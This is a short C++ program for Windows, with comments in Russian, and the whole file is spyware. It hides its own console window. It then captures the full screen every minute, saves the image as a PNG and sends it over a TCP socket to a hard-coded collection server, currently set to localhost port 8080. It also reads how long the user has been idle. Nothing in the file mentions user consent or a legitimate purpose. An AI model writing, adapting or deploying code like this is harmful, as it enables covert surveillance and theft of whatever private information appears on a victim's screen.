#include <windows.h>
#include <gdiplus.h>
#include <string>
#include <iostream>
#include <fstream>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment (lib,"Gdiplus.lib")
#pragma comment(lib, "Ws2_32.lib")

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 8080

using namespace Gdiplus;

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;

    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    free(pImageCodecInfo);
    return -1;
}

void SaveScreenshot(const std::string& filename) {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);

    RECT rc;
    GetClientRect(GetDesktopWindow(), &rc);

    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, rc.right, rc.bottom);
    SelectObject(hdcMemDC, hbmScreen);

    BitBlt(hdcMemDC, 0, 0, rc.right, rc.bottom, hdcScreen, 0, 0, SRCCOPY);

    CLSID clsid;
    GetEncoderClsid(L"image/png", &clsid);

    Bitmap bmp(hbmScreen, NULL);
    bmp.Save(std::wstring(filename.begin(), filename.end()).c_str(), &clsid, NULL);

    DeleteObject(hbmScreen);
    DeleteDC(hdcMemDC);
    ReleaseDC(NULL, hdcScreen);
    GdiplusShutdown(gdiplusToken);
}

void SendFile(const std::string& filename) {
    WSADATA wsaData;
    SOCKET SendSocket = INVALID_SOCKET;
    sockaddr_in serverAddr;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SendSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (SendSocket == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);

    connect(SendSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));

    std::ifstream file(filename, std::ios::binary);
    char buffer[1024];
    while (file.read(buffer, sizeof(buffer))) {
        send(SendSocket, buffer, file.gcount(), 0);
    }
    file.close();

    closesocket(SendSocket);
    WSACleanup();
}

DWORD GetLastInputTime() {
    LASTINPUTINFO lii;
    lii.cbSize = sizeof(LASTINPUTINFO);
    if (GetLastInputInfo(&lii)) {
        return GetTickCount() - lii.dwTime;
    }
    return 0;
}

int main() {
    // Скрытый запуск
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Основной цикл
    while (true) {
        // Получение времени последней активности пользователя
        DWORD idleTime = GetLastInputTime();
        std::cout << "Last input time (in milliseconds): " << idleTime << std::endl;

        // Сохранение и отправка скриншота
        std::string filename = "screenshot.png";
        SaveScreenshot(filename);
        SendFile(filename);
        std::cout << "Screenshot sent to server." << std::endl;

        // Задержка перед следующей отправкой
        Sleep(60000); // 1 минута
    }

    return 0;
}
